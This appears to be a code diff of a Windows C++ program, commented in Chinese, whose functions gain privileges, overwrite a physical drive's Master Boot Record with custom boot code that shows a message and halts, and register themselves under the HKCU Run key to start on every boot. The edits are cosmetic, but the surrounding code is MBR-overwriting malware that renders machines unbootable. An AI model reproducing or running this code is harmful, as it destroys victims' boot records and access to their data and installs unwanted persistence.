@@ -4,10 +4,9 @@
 
 using namespace std;
 //自定义MBR
-#pragma warning(push)
-#pragma warning (disable:4309 4838)
 
-#pragma warning(pop)
+
+
 
 
 void GetPrivileges()
@@ -32,7 +31,10 @@ void GetPrivileges()
 //写MBR
 bool WritePhydriveMBR(unsigned int id,char *msgstr)
 {
+	#pragma warning(push)
+	#pragma warning (disable:4309 4838)
 	static char pMBR[512] = { 0xB8,0x11,0x00,0xCD,0x10,0xBD,0x18,0x7C,0xB9,/*字符位数*/0x00,0x00,0xB8,0x01,0x13,0xBB,0x0C,0x00,0xBA,0x00,0x00,0xCD,0x10,0xEB,0xFE };
+	#pragma warning(pop)
 	static bool isfirstuse=true;
 	if (isfirstuse)
 	{
@@ -81,9 +83,9 @@ wstring ReadPhydriveMBR(unsigned int id)
 void RegAutoStart()
 {
 	HKEY hKey;
-	wstring strRegPath = _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
+	const TCHAR *strRegPath = _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
 	//1、找到系统的启动项  
-	if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) ///打开启动项       
+	if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) ///打开启动项       
 	{
 		//2、得到本程序自身的全路径
 		TCHAR strExeFullDir[MAX_PATH];
